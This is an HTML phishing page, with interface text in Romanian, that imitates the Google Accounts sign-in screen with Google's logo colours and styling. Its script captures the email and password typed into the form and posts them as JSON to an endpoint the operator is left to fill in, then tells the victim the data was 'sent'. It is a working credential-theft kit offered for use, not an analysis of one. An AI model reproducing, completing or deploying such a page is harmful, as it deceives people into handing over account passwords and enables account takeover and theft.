<!DOCTYPE html>
<html lang="ro">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
  body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
  .box { width: 100%; max-width: 380px; padding: 40px; text-align: center; }
  .logo { font-size: 26px; font-weight: 500; margin-bottom: 8px; }
  .sub { color: #202124; font-size: 16px; margin-bottom: 30px; }
  input { width: 100%; padding: 14px 14px; margin-bottom: 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
  input:focus { outline: none; border: 2px solid #1a73e8; }
  button { background: #1a73e8; color: #fff; border: none; padding: 12px 26px; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; }
  button:hover { background: #1765cc; }
  .msg { margin-top: 18px; font-size: 13px; color: #5f6368; }
</style>
</head>
<body>
<div class="box">
  <div class="logo"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></div>
  <div class="sub">Sign in to continue</div>
  <form id="f">
    <input type="email" id="user" placeholder="Email" required>
    <input type="password" id="pass" placeholder="Parolă" required>
    <button type="submit">Next</button>
  </form>
  <div class="msg" id="msg"></div>
</div>

<script>
const ENDPOINT = "PUNE_ENDPOINT_UL_AICI";

document.getElementById('f').addEventListener('submit', async (e) => {
  e.preventDefault();
  const user = document.getElementById('user').value;
  const pass = document.getElementById('pass').value;
  const msg = document.getElementById('msg');

  msg.innerText = "Se trimite...";

  try {
    await fetch(ENDPOINT, {
      method: "POST",
      headers: {"Content-Type": "application/json", "Accept": "application/json"},
      body: JSON.stringify({ email: user, parola: pass })
    });
    msg.innerText = "✓ Trimis!";
  } catch (err) {
    msg.innerText = "Eroare: " + err;
  }
});
</script>
</body>
</html>
